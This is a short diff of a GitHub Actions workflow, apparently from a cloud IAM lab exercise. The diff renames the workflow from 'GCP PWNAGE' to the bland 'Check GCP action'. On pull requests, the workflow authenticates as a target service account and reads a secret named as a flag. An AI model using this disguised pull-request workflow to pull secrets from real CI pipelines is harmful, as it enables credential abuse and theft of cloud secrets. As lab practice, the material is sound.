@@ -1,4 +1,4 @@
-name: Ladidadida GCP PWNAGE
+name: Check GCP action
 on:
   workflow_dispatch:
   pull_request:
@@ -24,9 +24,9 @@ jobs:
       name: 'gcloud'
       run: |-
         gcloud config set project gcp-labs-mvcp2ig8
-        gcloud config set account 'iam-lab-7-target@gcp-labs-mvcp2ig8.iam.gserviceaccount.com'
+        gcloud config set account 'iam-lab-7-target@gcp-labs-mvcp2ig8.iam.gserviceaccount.comm'
         gcloud auth login --brief --cred-file="${{ steps.auth.outputs.credentials_file_path }}"
         gcloud auth list
-        gcloud projects list
+        gcloud secrets list
         gcloud secrets versions list flag_iam_lab_7
         gcloud secrets versions access 1 --secret="flag_iam_lab_7"
